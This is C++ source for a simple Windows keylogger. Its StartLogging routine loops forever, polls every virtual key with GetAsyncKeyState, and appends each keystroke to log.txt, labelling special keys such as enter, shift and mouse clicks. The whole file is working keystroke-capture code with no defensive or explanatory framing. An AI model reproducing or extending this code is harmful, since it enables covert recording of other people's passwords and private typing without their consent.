#include "Key.h"
#include <iostream>
#include <fstream>

using namespace std;

void Key::StartLogging() {
	while (true) {
		for (cKeys = 0; cKeys <= 254; cKeys++) {
			if (GetAsyncKeyState(cKeys) & 0x1)
			{
				SetKeys(cKeys);
				ofstream log("log.txt", ios::app);
				//log.open("log.txt");
				if (!log.fail()) {
					log.flush();
					switch (cKeys) {
						case VK_BACK:
							log << "[backspace]";
							cout << cKeys;
							break;
						case VK_RETURN:
							log << "[enter]";
							cout << cKeys;
							break;
						case VK_SHIFT:
							log << "[shift]";
							cout << cKeys;
							break;
						case VK_CONTROL:
							log << "[control]";
							cout << cKeys;
							break;
						case VK_CAPITAL:
							log << "[mayus]";
							cout << cKeys;
							break;
						case VK_TAB:
							log << "[tab]";
							cout << cKeys;
							break;
						case VK_MENU:
							log << "[alt]";
							cout << cKeys;
							break;
						case VK_LBUTTON:
							log << "[clic]";
							cout << cKeys;
							break;
						case VK_RBUTTON:
							log << "[rclic]";
							cout << cKeys;
							break;
						default:
							log << cKeys;
							cout << cKeys;
						}
					log.close();
				}
			}
		}
	}
} 